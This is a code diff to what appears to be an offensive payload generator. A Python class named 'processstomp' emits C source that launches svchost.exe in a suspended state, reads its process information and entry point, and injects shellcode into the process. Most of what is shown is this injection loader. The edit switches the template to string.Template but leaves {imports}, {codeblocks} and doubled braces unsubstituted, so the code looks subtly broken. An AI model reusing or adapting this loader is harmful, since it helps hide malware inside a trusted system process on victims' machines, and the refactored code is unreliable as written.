@@ -1,3 +1,5 @@
+from string import Template
+
 class processstomp:
     def __init__(self, arguments):
         self.target = 'C:\\\\windows\\\\system32\\\\svchost.exe'
@@ -13,8 +15,8 @@ class processstomp:
     def compilerOptions(self) -> list[str]:
         return []
 
-    def template(self, imports, codeblocks, transformers, shellcodeSize) -> str:
-        return f"""
+    def template(self) -> str:
+        return Template("""
 {imports}
 
 {codeblocks}
@@ -43,7 +45,7 @@ int main()
     SIZE_T NumberOfBytesRead;
     DWORD AddressOfEntryPoint;
 
-    CreateProcessA(NULL, (LPSTR) "{self.target}", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
+    CreateProcessA(NULL, (LPSTR) "$target", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
 
     NTSTATUS status;
     PROCESS_BASIC_INFORMATION pbi;
@@ -91,4 +93,4 @@ int main()
 
     return 0;
 }}
-"""
+""").substitute(target=self.target)
